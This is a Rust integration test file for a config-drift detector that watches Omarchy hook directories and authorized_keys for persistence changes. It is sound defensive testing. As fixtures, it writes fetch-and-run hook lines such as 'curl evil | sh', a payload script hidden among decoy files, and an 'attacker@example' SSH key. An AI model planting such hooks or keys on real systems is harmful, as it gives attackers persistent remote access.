//! WP-113 (ADR-0028 §8 WP-E) through the command line: the hook-path
//! blind spots (a linked hook directory, a binary script, a script over
//! 1 MiB) yield their events, the toggles directory is hashed with
//! Omarchy's flags as evidence, and `~/.ssh/authorized_keys` is a crisis
//! once the user watches it. Always through `common::Env` (a temp HOME;
//! Omarchy's tree is `<tmp>/omarchy`, never the host's).

mod common;

use std::path::Path;

use serde_json::Value;

use common::{Env, Snapper, json, read, stderr};

fn write(path: impl AsRef<Path>, bytes: impl AsRef<[u8]>) {
    let path = path.as_ref();
    std::fs::create_dir_all(path.parent().unwrap()).unwrap();
    std::fs::write(path, bytes).unwrap();
}

fn symlink(target: &Path, link: &Path) {
    std::fs::create_dir_all(link.parent().unwrap()).unwrap();
    std::os::unix::fs::symlink(target, link).unwrap();
}

/// `dir` and every directory below it get `mode` (the guard's owner owns
/// them: under `SELDON_TEST_GUARD` that stands in for root).
fn trust(dir: &Path, mode: u32) {
    use std::os::unix::fs::PermissionsExt as _;
    for entry in std::fs::read_dir(dir).unwrap() {
        let p = entry.unwrap().path();
        if p.is_dir() {
            trust(&p, mode);
        }
    }
    std::fs::set_permissions(dir, std::fs::Permissions::from_mode(mode)).unwrap();
}

fn ok(env: &Env, args: &[&str]) -> Value {
    let out = env.seldon(args);
    assert_eq!(out.status.code(), Some(0), "{args:?}: {}", stderr(&out));
    json(&out)
}

fn capture_config(env: &Env) -> Value {
    let c = ok(env, &["capture", "--source", "config", "--json"]);
    assert_eq!(c["ok"], true, "{c}");
    c
}

/// The config collector's message of a capture, empty without one.
fn message(capture: &Value) -> String {
    capture["collectors"]
        .as_array()
        .unwrap()
        .iter()
        .find(|c| c["name"] == "config")
        .and_then(|c| c["message"].as_str())
        .unwrap_or_default()
        .to_string()
}

/// The config events of the ledger: (kind, subject, meta).
fn config_events(env: &Env) -> Vec<(String, String, Value)> {
    common::ledger(&env.tmp.path().join("logbook"))
        .into_iter()
        .filter(|e| e["source"] == "config")
        .map(|e| {
            (
                e["kind"].as_str().unwrap().to_string(),
                e["subject"].as_str().unwrap().to_string(),
                e["meta"].clone(),
            )
        })
        .collect()
}

/// `seldon drift --all --json`: "class rule" of the item of `subject`.
fn class(env: &Env, subject: &str) -> String {
    ok(env, &["drift", "--all", "--json"])["drift"]
        .as_array()
        .unwrap()
        .iter()
        .find(|d| d["subject"] == subject)
        .map(|d| {
            format!(
                "{} {}",
                d["class"].as_str().unwrap(),
                d["rule"].as_str().unwrap()
            )
        })
        .unwrap_or_else(|| panic!("no drift item {subject}"))
}

/// `seldon drift --all --json`: "class rule" of the item of `subject` and
/// `kind`.
fn class_of(env: &Env, subject: &str, kind: &str) -> String {
    ok(env, &["drift", "--all", "--json"])["drift"]
        .as_array()
        .unwrap()
        .iter()
        .find(|d| d["subject"] == subject && d["kind"] == kind)
        .map(|d| {
            format!(
                "{} {}",
                d["class"].as_str().unwrap(),
                d["rule"].as_str().unwrap()
            )
        })
        .unwrap_or_else(|| panic!("no drift item {kind} {subject}"))
}

/// `seldon drift --json`: the subjects of the open items.
fn open_items(env: &Env) -> Vec<String> {
    ok(env, &["drift", "--json"])["drift"]
        .as_array()
        .unwrap()
        .iter()
        .map(|d| d["subject"].as_str().unwrap().to_string())
        .collect()
}

/// Whether the tests run as root (CI): root reads a file whatever its mode.
fn root() -> bool {
    use std::os::unix::fs::MetadataExt as _;
    std::fs::metadata("/proc/self").is_ok_and(|m| m.uid() == 0)
}

/// WP-109 stage 1: three ways a hook ran without an event. Each now yields
/// one on the persistence path, hash only, and is a crisis; outside the
/// persistence paths nothing changes. A second capture writes nothing.
#[test]
fn hook_blind_spots_yield_crises() {
    let env = Env::new(Snapper::Missing);
    env.init_logbook();
    let home = &env.home;
    write(
        home.join(".config/omarchy/hooks/post-update.d/x.sample"),
        "#!/bin/bash\n",
    );
    write(home.join(".config/hypr/hyprland.lua"), "-- mine\n");
    capture_config(&env); // baseline

    // a hook directory that is a link (dotfile managers)
    write(
        home.join("dotfiles/boot.d/run.sh"),
        "#!/bin/bash\necho boot\n",
    );
    symlink(
        &home.join("dotfiles/boot.d"),
        &home.join(".config/omarchy/hooks/post-boot.d"),
    );
    // bash runs a script with a NUL after its first line
    let binary = b"#!/bin/bash\necho hi\n\0\0payload\n".to_vec();
    write(
        home.join(".config/omarchy/hooks/post-update.d/nul.sh"),
        &binary,
    );
    // a script over 1 MiB
    let mut big = b"#!/bin/bash\n".to_vec();
    big.resize(2 << 20, b'#');
    write(home.join(".config/omarchy/hooks/theme-set.d/big.sh"), &big);
    // outside the persistence paths: a binary file stays skipped and a
    // linked directory is not followed
    write(home.join(".config/hypr/blob.lua"), b"--\0\0");
    write(home.join("dotfiles/hypr/extra.lua"), "-- extra\n");
    symlink(
        &home.join("dotfiles/hypr"),
        &home.join(".config/hypr/linked"),
    );

    capture_config(&env);
    let events = config_events(&env);
    let added: Vec<&str> = events
        .iter()
        .filter(|e| e.0 == "config-add")
        .map(|e| e.1.as_str())
        .collect();
    assert_eq!(
        added,
        [
            "~/.config/omarchy/hooks/post-boot.d/run.sh",
            "~/.config/omarchy/hooks/post-update.d/nul.sh",
            "~/.config/omarchy/hooks/theme-set.d/big.sh",
        ]
    );
    let meta = |s: &str| &events.iter().find(|e| e.1 == s).unwrap().2;
    assert_eq!(
        meta("~/.config/omarchy/hooks/post-update.d/nul.sh")["hashTo"],
        seldon::sys::sha256_hex(&binary)
    );
    assert_eq!(
        meta("~/.config/omarchy/hooks/theme-set.d/big.sh")["hashTo"],
        seldon::sys::sha256_hex(&big)
    );
    for s in &added {
        assert_eq!(class(&env, s), "crisis always-red-paths", "{s}");
    }
    // hashes only: neither content nor the link target reaches the ledger
    let ledger = std::fs::read_dir(env.tmp.path().join("logbook/ledger"))
        .unwrap()
        .map(|e| e.unwrap().path())
        .filter(|p| p.extension().is_some_and(|x| x == "jsonl"))
        .map(|p| read(&p))
        .collect::<String>();
    assert!(
        !ledger.contains("payload") && !ledger.contains("dotfiles"),
        "{ledger}"
    );

    // idempotent
    let n = config_events(&env).len();
    capture_config(&env);
    assert_eq!(config_events(&env).len(), n);

    // a change behind the link and in the binary script: one event each
    write(
        home.join("dotfiles/boot.d/run.sh"),
        "#!/bin/bash\necho evil\n",
    );
    write(
        home.join(".config/omarchy/hooks/post-update.d/nul.sh"),
        b"#!/bin/bash\n\0x",
    );
    capture_config(&env);
    let changed: Vec<String> = config_events(&env)[n..]
        .iter()
        .map(|e| format!("{} {}", e.0, e.1))
        .collect();
    assert_eq!(
        changed,
        [
            "config-change ~/.config/omarchy/hooks/post-boot.d/run.sh",
            "config-change ~/.config/omarchy/hooks/post-update.d/nul.sh",
        ]
    );
    let n = config_events(&env).len();
    capture_config(&env);
    assert_eq!(config_events(&env).len(), n);
}

/// WP-113 round 2 (B1): a link back to a directory the walk went through
/// is not followed — here the hook directory itself, with no link above it
/// (without the guard on link targets the walk would cycle into the
/// budget).
#[test]
fn a_back_link_to_an_ancestor_is_not_followed() {
    let env = Env::new(Snapper::Missing);
    env.init_logbook();
    let hooks = env.home.join(".config/omarchy/hooks");
    write(hooks.join("post-update.d/one.sh"), "#!/bin/bash\n");
    capture_config(&env); // baseline
    symlink(&hooks, &hooks.join("post-update.d/back"));
    let c = capture_config(&env);
    let message = message(&c);
    assert!(
        message.contains("1 linked director(ies) not followed: walked already"),
        "{message}"
    );
    assert!(!message.contains("cut off"), "{message}");
    assert!(config_events(&env).is_empty(), "{:?}", config_events(&env));
}

/// B1: a two-link cycle outside the home directory (A → B → A) is walked
/// once; the hook directory is a link into it.
#[test]
fn a_two_link_cycle_is_walked_once() {
    let env = Env::new(Snapper::Missing);
    env.init_logbook();
    let (a, b) = (
        env.tmp.path().join("cycle/a"),
        env.tmp.path().join("cycle/b"),
    );
    write(a.join("a.sh"), "#!/bin/bash\n");
    write(b.join("b.sh"), "#!/bin/bash\n");
    symlink(&b, &a.join("to-b"));
    symlink(&a, &b.join("to-a"));
    capture_config(&env); // baseline
    symlink(&a, &env.home.join(".config/omarchy/hooks/post-update.d"));
    let c = capture_config(&env);
    let message = message(&c);
    assert!(
        message.contains("1 linked director(ies) not followed"),
        "{message}"
    );
    assert!(!message.contains("cut off"), "{message}");
    let added: Vec<String> = config_events(&env).into_iter().map(|e| e.1).collect();
    assert_eq!(
        added,
        [
            "~/.config/omarchy/hooks/post-update.d/a.sh",
            "~/.config/omarchy/hooks/post-update.d/to-b/b.sh",
        ]
    );
}

/// B1: below links no real directory is walked twice — a second link to
/// a directory above one walked already does not walk that one again
/// (without the guard on directories below links it would).
#[test]
fn below_links_no_directory_is_walked_twice() {
    let env = Env::new(Snapper::Missing);
    env.init_logbook();
    let x = env.tmp.path().join("x");
    write(x.join("a/f.sh"), "#!/bin/bash\n");
    write(x.join("top.sh"), "#!/bin/bash\n");
    capture_config(&env); // baseline
    let hooks = env.home.join(".config/omarchy/hooks");
    symlink(&x.join("a"), &hooks.join("l1.d"));
    symlink(&x, &hooks.join("l2.d"));
    capture_config(&env);
    let added: Vec<String> = config_events(&env).into_iter().map(|e| e.1).collect();
    assert_eq!(
        added,
        [
            "~/.config/omarchy/hooks/l1.d/f.sh",
            "~/.config/omarchy/hooks/l2.d/top.sh",
        ]
    );
}

/// B1, the reviewer's probe: two links per level, 17 levels deep, used to
/// double the walk per level (hours at 25 levels). Each directory is
/// walked once: fast, and the manifest stays small.
#[test]
fn a_diamond_of_links_is_linear() {
    let env = Env::new(Snapper::Missing);
    env.init_logbook();
    let levels = 17;
    let d = |i: usize| env.tmp.path().join(format!("diamond/d{i:02}"));
    for i in 0..=levels {
        write(d(i).join("f.sh"), format!("#!/bin/bash\n# {i}\n"));
    }
    for i in 0..levels {
        symlink(&d(i + 1), &d(i).join("a"));
        symlink(&d(i + 1), &d(i).join("b"));
    }
    capture_config(&env); // baseline
    symlink(&d(0), &env.home.join(".config/omarchy/hooks/post-update.d"));
    let start = std::time::Instant::now();
    let c = capture_config(&env);
    let took = start.elapsed();
    assert!(took < std::time::Duration::from_secs(1), "{took:?}");
    let manifest = env.home.join(".local/state/seldon/manifest.json");
    let size = std::fs::metadata(&manifest).unwrap().len();
    assert!(size < 64 * 1024, "manifest {size} bytes");
    assert_eq!(config_events(&env).len(), levels + 1, "one file per level");
    assert!(message(&c).contains(&format!("{levels} linked director(ies) not followed")));
}

/// B1: one budget per walk. A link past it is cut off: one crisis on the
/// link itself (a persistence path nobody can see into), nothing listed
/// below it, the files recorded there before keep their hashes; once it
/// fits again the changes made meanwhile show — decoys cannot hide a
/// payload.
#[test]
fn a_link_past_the_budget_is_cut_off_and_a_crisis() {
    let env = Env::new(Snapper::Missing);
    env.init_logbook();
    let target = env.tmp.path().join("big");
    write(target.join("aa.sh"), "#!/bin/bash\n");
    let link = env.home.join(".config/omarchy/hooks/post-update.d");
    symlink(&target, &link);
    capture_config(&env); // baseline: aa.sh known
    let key = "~/.config/omarchy/hooks/post-update.d";

    let budget = seldon::collectors::config::LINKED_ENTRIES;
    for i in 0..budget {
        write(target.join(format!("decoy/{i:05}")), format!("{i}\n"));
    }
    write(target.join("aa.sh"), "#!/bin/bash\ncurl x | sh\n");
    write(target.join("zz-payload.sh"), "#!/bin/bash\nevil\n");
    let c = capture_config(&env);
    assert!(
        message(&c).contains("1 linked director(ies) cut off"),
        "{c}"
    );
    let events = config_events(&env);
    assert_eq!(
        events.len(),
        1,
        "only the link: {:?}",
        events.iter().map(|e| &e.1).collect::<Vec<_>>()
    );
    assert_eq!(
        (events[0].0.as_str(), events[0].1.as_str()),
        ("config-add", key)
    );
    assert_eq!(events[0].2["cutOff"], true);
    assert_eq!(class_of(&env, key, "config-add"), "crisis always-red-paths");
    let manifest = env.home.join(".local/state/seldon/manifest.json");
    assert!(
        std::fs::metadata(&manifest).unwrap().len() < 64 * 1024,
        "nothing listed below"
    );
    let n = config_events(&env).len();
    capture_config(&env);
    assert_eq!(config_events(&env).len(), n, "idempotent while cut off");

    // the decoys go: the payload and the change made meanwhile show
    std::fs::remove_dir_all(target.join("decoy")).unwrap();
    capture_config(&env);
    let mut after: Vec<String> = config_events(&env)[n..]
        .iter()
        .map(|e| format!("{} {}", e.0, e.1))
        .collect();
    after.sort(); // the ledger orders them by time
    assert_eq!(
        after,
        [
            format!("config-add {key}/zz-payload.sh"),
            format!("config-change {key}/aa.sh"),
            format!("config-remove {key}"),
        ]
    );
}

/// N3: a persistence-path link into the logbook (or the state directory,
/// or `~/.config/seldon`) is not followed: it would change with every
/// capture.
#[test]
fn a_link_into_the_logbook_is_not_followed() {
    let env = Env::new(Snapper::Missing);
    let logbook = env.init_logbook();
    capture_config(&env); // baseline
    symlink(
        &logbook.join("ledger"),
        &env.home.join(".config/omarchy/hooks/post-update.d"),
    );
    symlink(
        &env.home.join(".local/state/seldon"),
        &env.home.join(".config/omarchy/hooks/state.d"),
    );
    symlink(
        &logbook.join("STATUS.md"),
        &env.home.join(".config/omarchy/hooks/status"),
    );
    for _ in 0..4 {
        let c = capture_config(&env);
        assert!(
            message(&c).contains("3 link(s) into Seldon's own files not followed"),
            "{c}"
        );
    }
    assert!(config_events(&env).is_empty(), "{:?}", config_events(&env));
}

/// N1: a hook that was unreadable for a while keeps its last hash, so the
/// content it has when readable again is compared and evented.
#[test]
fn an_unreadable_round_trip_is_seen() {
    if root() {
        eprintln!("skipped: root reads every file");
        return;
    }
    use std::os::unix::fs::PermissionsExt as _;
    let env = Env::new(Snapper::Missing);
    env.init_logbook();
    let hook = env.home.join(".config/omarchy/hooks/post-update.d/x.sh");
    write(&hook, "#!/bin/bash\necho ok\n");
    capture_config(&env); // baseline
    std::fs::set_permissions(&hook, std::fs::Permissions::from_mode(0o200)).unwrap();
    let c = capture_config(&env);
    assert!(
        message(&c).contains("1 file(s) under persistence paths could not be read"),
        "{c}"
    );
    std::fs::write(&hook, "#!/bin/bash\ncurl evil | sh\n").unwrap();
    capture_config(&env);
    std::fs::set_permissions(&hook, std::fs::Permissions::from_mode(0o755)).unwrap();
    capture_config(&env);
    let events = config_events(&env);
    assert_eq!(events.len(), 1, "{events:?}");
    assert_eq!(events[0].0, "config-change");
    assert_eq!(
        class_of(
            &env,
            "~/.config/omarchy/hooks/post-update.d/x.sh",
            "config-change"
        ),
        "crisis always-red-paths"
    );
}

/// N2: a file over 64 MiB under a persistence path is not read: its hash is
/// a fingerprint of size, time and inode, and the event says so. The
/// reviewer's 2 GiB sparse hook returns at once.
#[test]
fn a_huge_hook_is_hashed_by_its_metadata() {
    let env = Env::new(Snapper::Missing);
    env.init_logbook();
    capture_config(&env); // baseline
    let hook = env.home.join(".config/omarchy/hooks/post-update.d/huge.sh");
    std::fs::create_dir_all(hook.parent().unwrap()).unwrap();
    std::fs::File::create(&hook)
        .unwrap()
        .set_len(2 << 30)
        .unwrap();
    let start = std::time::Instant::now();
    capture_config(&env);
    assert!(
        start.elapsed() < std::time::Duration::from_secs(2),
        "{:?}",
        start.elapsed()
    );
    let events = config_events(&env);
    assert_eq!(events.len(), 1, "{events:?}");
    assert_eq!(events[0].2["hashBasis"], "stat");
    let meta = std::fs::metadata(&hook).unwrap();
    assert_eq!(events[0].2["hashTo"], seldon_stat_hash(&meta));
    std::fs::remove_file(&hook).unwrap();
}

/// The fingerprint `stat_hash` writes, recomputed: `stat <size> <mtime ns>
/// <inode>`.
fn seldon_stat_hash(meta: &std::fs::Metadata) -> String {
    use std::os::unix::fs::MetadataExt as _;
    let mtime = meta
        .modified()
        .unwrap()
        .duration_since(std::time::UNIX_EPOCH)
        .unwrap()
        .as_nanos();
    seldon::sys::sha256_hex(format!("stat {} {} {}\n", meta.len(), mtime, meta.ino()).as_bytes())
}

/// Upgrading to WP-113 hashes a binary or large hook that an earlier
/// engine listed as skipped: no event for it (the move is no change), and
/// its later changes are seen. Stands in for the earlier engine: a config
/// without persistence paths.
#[test]
fn a_skipped_hook_becomes_hashed_without_an_event() {
    let env = Env::new(Snapper::Missing);
    env.init_logbook();
    let home = &env.home;
    let hook = home.join(".config/omarchy/hooks/post-update.d/nul.sh");
    write(&hook, b"#!/bin/bash\n\0");
    let text = read(&env.config_file());
    let mut t: toml::Table = text.parse().unwrap();
    t["drift"].as_table_mut().unwrap().insert(
        "alwaysRedPaths".into(),
        toml::Value::Array(vec!["~/nothing".into()]),
    );
    std::fs::write(env.config_file(), toml::to_string(&t).unwrap()).unwrap();
    capture_config(&env); // baseline: skipped
    std::fs::write(env.config_file(), &text).unwrap();
    capture_config(&env);
    assert!(config_events(&env).is_empty(), "{:?}", config_events(&env));
    write(&hook, b"#!/bin/bash\n\0\0");
    capture_config(&env);
    let events = config_events(&env);
    assert_eq!(events.len(), 1, "{events:?}");
    assert_eq!(events[0].0, "config-change");
}

/// ADR-0037 §1 (B2): a toggle is routine both ways. Omarchy's menu
/// toggles touch and remove empty flag files (`omarchy-toggle`: bar,
/// screensaver, suspend, crash capture); `omarchy-hyprland-toggle` copies
/// and removes Omarchy's flag (`omarchy-default` evidence, also recorded
/// on the removal). Neither is ever a drift item. Lua of unknown origin
/// there stays attention.
#[test]
fn toggles_are_routine_both_ways() {
    let env = Env::new(Snapper::Missing);
    env.init_logbook();
    let home = &env.home;
    let omarchy = env.tmp.path().join("omarchy");
    let flag = "-- window-no-gaps\nhl.config({ general = { gaps_in = 0 } })\n";
    write(
        omarchy.join("default/hypr/toggles/window-no-gaps.lua"),
        flag,
    );
    write(omarchy.join("default/hypr/toggles/flags.lua"), "-- flags\n");
    trust(&omarchy, 0o755);
    let toggles = home.join(".local/state/omarchy/toggles");
    write(toggles.join("hypr/flags.lua"), "-- flags\n");
    write(toggles.join("bar-off"), "");
    capture_config(&env); // baseline

    // on: two menu flags, one Hyprland flag; and foreign Lua
    write(toggles.join("screensaver-off"), "");
    write(toggles.join("suspend-off"), "");
    write(toggles.join("hypr/window-no-gaps.lua"), flag);
    write(toggles.join("hypr/mine.lua"), "hl.exec('x')\n");
    // off: a menu flag
    std::fs::remove_file(toggles.join("bar-off")).unwrap();
    capture_config(&env);
    let key = |n: &str| format!("~/.local/state/omarchy/toggles/{n}");
    assert_eq!(
        class_of(&env, &key("screensaver-off"), "config-add"),
        "routine toggle-flag"
    );
    assert_eq!(
        class_of(&env, &key("bar-off"), "config-remove"),
        "routine toggle-flag"
    );
    assert_eq!(
        class_of(&env, &key("hypr/window-no-gaps.lua"), "config-add"),
        "routine omarchy-default"
    );
    assert_eq!(
        class_of(&env, &key("hypr/mine.lua"), "config-add"),
        "attention config"
    );
    assert_eq!(
        open_items(&env),
        [key("hypr/mine.lua")],
        "nothing else is drift"
    );

    // off again, and back on
    std::fs::remove_file(toggles.join("hypr/window-no-gaps.lua")).unwrap();
    std::fs::remove_file(toggles.join("screensaver-off")).unwrap();
    write(toggles.join("bar-off"), "");
    capture_config(&env);
    let events = config_events(&env);
    let off = events
        .iter()
        .find(|e| e.0 == "config-remove" && e.1 == key("hypr/window-no-gaps.lua"))
        .unwrap();
    assert_eq!(off.2["matches"], "omarchy-default");
    assert_eq!(
        class_of(&env, &key("hypr/window-no-gaps.lua"), "config-remove"),
        "routine omarchy-default"
    );
    assert_eq!(
        class_of(&env, &key("screensaver-off"), "config-remove"),
        "routine toggle-flag"
    );
    // a flag file that gained content is no flag file
    write(toggles.join("suspend-off"), "x\n");
    capture_config(&env);
    assert_eq!(
        class_of(&env, &key("suspend-off"), "config-change"),
        "attention config"
    );
    assert_eq!(open_items(&env).len(), 2, "{:?}", open_items(&env));
    let n = config_events(&env).len();
    capture_config(&env);
    assert_eq!(config_events(&env).len(), n, "idempotent");
}

/// `~/.ssh/authorized_keys` is no default watch path; once the user adds
/// it to `watchPaths` (the opt-in), a change is a crisis by the default
/// `alwaysRedPaths`, and only its hash is recorded.
#[test]
fn authorized_keys_is_a_crisis_once_watched() {
    let env = Env::new(Snapper::Missing);
    env.init_logbook();
    let keys = env.home.join(".ssh/authorized_keys");
    write(
        &keys,
        "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIEXAMPLE user@workstation\n",
    );
    capture_config(&env); // baseline
    write(
        &keys,
        "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIEXAMPLE2 other@example\n",
    );
    capture_config(&env);
    assert!(config_events(&env).is_empty(), "not watched by default");

    let text = read(&env.config_file());
    let opted = text.replacen(
        "watchPaths = [",
        "watchPaths = [\"~/.ssh/authorized_keys\", ",
        1,
    );
    assert_ne!(opted, text);
    std::fs::write(env.config_file(), opted).unwrap();
    let c = capture_config(&env);
    assert!(
        config_events(&env).is_empty(),
        "entering the scope is no change"
    );
    assert!(message(&c).contains("watch scope changed"), "{c}");

    write(
        &keys,
        "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIEXAMPLE3 attacker@example\n",
    );
    capture_config(&env);
    let events = config_events(&env);
    assert_eq!(events.len(), 1, "{events:?}");
    assert_eq!(events[0].1, "~/.ssh/authorized_keys");
    assert_eq!(
        class(&env, "~/.ssh/authorized_keys"),
        "crisis always-red-paths"
    );
    let ledger = common::ledger(&env.tmp.path().join("logbook"));
    assert!(
        !serde_json::to_string(&ledger).unwrap().contains("attacker"),
        "hashes only"
    );
}

/// A third-party plugin edited in place is quiet attention (ADR-0028 §2,
/// `plugin-*` row); Seldon's own plugin edited in place is explained by
/// SPEC-ENGINE §5 rule 8 (the dev install, an update through Omarchy).
#[test]
fn plugin_tree_changes_classify_by_the_plugin_rows() {
    let env = Env::new(Snapper::Missing);
    env.init_logbook();
    env.stub(
        "omarchy",
        r#"case "$2" in
list) printf '%s\n' '[{"id":"jax.seldon","enabled":true,"firstParty":false},{"id":"io.github.example.x","enabled":true,"firstParty":false}]';;
*) exit 1;;
esac"#,
    );
    let plugins = env.home.join(".config/omarchy/plugins");
    for id in ["jax.seldon", "io.github.example.x"] {
        write(
            plugins.join(id).join("manifest.json"),
            format!("{{\"id\":\"{id}\",\"version\":\"1.0.0\"}}"),
        );
        write(plugins.join(id).join("Widget.qml"), "Item {}\n");
    }
    let capture = || {
        let c = ok(&env, &["capture", "--source", "plugins", "--json"]);
        assert_eq!(c["ok"], true, "{c}");
    };
    capture(); // baseline
    for id in ["jax.seldon", "io.github.example.x"] {
        write(
            plugins.join(id).join("Widget.qml"),
            "Item { visible: false }\n",
        );
    }
    capture();
    let ledger = common::ledger(&env.tmp.path().join("logbook"));
    let updates: Vec<&Value> = ledger
        .iter()
        .filter(|e| e["kind"] == "plugin-update")
        .collect();
    assert_eq!(updates.len(), 2, "{ledger:?}");
    let own = updates
        .iter()
        .find(|e| e["subject"] == "jax.seldon")
        .unwrap();
    assert!(
        ledger.iter().any(|r| r["kind"] == "resolution"
            && r["refersTo"] == own["id"]
            && r["detail"] == "seldon's own plugin"),
        "{ledger:?}"
    );
    assert_eq!(class(&env, "io.github.example.x"), "attention plugin");
    let open: Vec<String> = ok(&env, &["drift", "--json"])["drift"]
        .as_array()
        .unwrap()
        .iter()
        .map(|d| d["subject"].as_str().unwrap().to_string())
        .collect();
    assert_eq!(open, ["io.github.example.x"]);
}
